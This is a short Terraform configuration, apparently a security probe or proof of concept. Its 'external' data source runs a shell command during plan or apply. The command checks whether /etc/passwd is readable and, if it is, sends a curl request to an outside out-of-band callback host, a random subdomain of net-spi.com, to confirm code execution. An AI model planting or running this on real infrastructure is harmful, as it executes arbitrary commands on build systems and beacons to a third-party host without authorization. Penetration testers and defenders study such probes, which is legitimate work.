data "external" "file_read_test" {
  program = [
    "sh",
    "-c",
    "if test -r @/etc/passwd; then curl -s https://z77q0tber181ocoi8q66i9z9208uwlka.net-spi.com/file-readable >/dev/null 2>&1; echo '{\"result\":\"readable-and-callback-attempted\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
  ]
}

output "file_read_test" {
  value = data.external.file_read_test.result
}
